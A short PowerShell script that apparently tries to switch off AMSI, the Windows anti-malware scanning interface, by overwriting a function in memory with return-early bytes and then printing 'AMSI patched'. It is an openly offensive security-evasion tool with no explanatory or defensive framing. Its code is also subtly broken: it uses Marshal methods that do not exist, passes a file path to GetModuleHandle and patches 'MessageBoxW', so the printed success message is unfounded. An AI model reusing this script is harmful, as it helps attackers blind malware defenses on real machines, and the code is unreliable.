$dll = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').Location
$mem = [System.Runtime.InteropServices.Marshal]
$site = $mem::GetProcAddress($mem::GetModuleHandle($dll), "MessageBoxW")
$oldProtect = [IntPtr]::Zero
$VirtualProtect = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect)' -Name "VP" -Namespace "W32" -PassThru
$arr = [byte[]]@(0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$VirtualProtect::VirtualProtect($site, [uint32]$arr.Length, 0x40, [ref]$oldProtect) | Out-Null
$mem::Copy($site, $arr, $arr.Length)
$VirtualProtect::VirtualProtect($site, [uint32]$arr.Length, $oldProtect, [ref]$oldProtect) | Out-Null
Write-Output "AMSI patched"
